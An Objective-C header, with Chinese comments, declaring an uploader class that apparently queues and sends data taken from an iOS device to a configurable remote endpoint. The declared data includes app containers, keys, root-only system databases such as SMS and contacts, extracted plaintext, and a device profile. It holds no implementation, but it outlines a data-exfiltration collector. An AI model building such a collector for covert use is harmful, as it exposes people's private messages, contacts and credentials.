#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

extern NSString * const OWUploadKindContainer;
extern NSString * const OWUploadKindKeys;
extern NSString * const OWUploadKindMeta;
extern NSString * const OWUploadKindSystem;   // 系统库（短信/通讯录…），需 root
extern NSString * const OWUploadKindHits;     // 端上抽取出的明文命中

@interface OWUploader : NSObject

/// 当前生效端点：UserDefaults 的 OWUploadEndpointOverride 优先，其次 Info.plist 的 OWUploadEndpoint。
+ (NSString *)activeEndpoint;

@property (nonatomic, readonly, nullable) NSString *endpoint;   // 取自 activeEndpoint
@property (nonatomic, readonly) NSString *pendingDir;
@property (nonatomic) NSUInteger maxRetries;                    // 默认 3
@property (nonatomic, readonly) NSUInteger uploadedCount;
@property (nonatomic, readonly) NSUInteger failedCount;

// 入队：文件写入 pending 目录（断网暂存），随后 flush 时统一上传
- (BOOL)enqueueFile:(NSString *)path kind:(NSString *)kind error:(NSError **)error;

// 逐个上传 pending 中未成功的条目；失败保留在队列，下次启动继续
- (BOOL)flush:(NSError **)error;

// 设备画像作为 manifest 一并上传
- (BOOL)enqueueManifest:(NSDictionary *)manifest error:(NSError **)error;

@end

NS_ASSUME_NONNULL_END
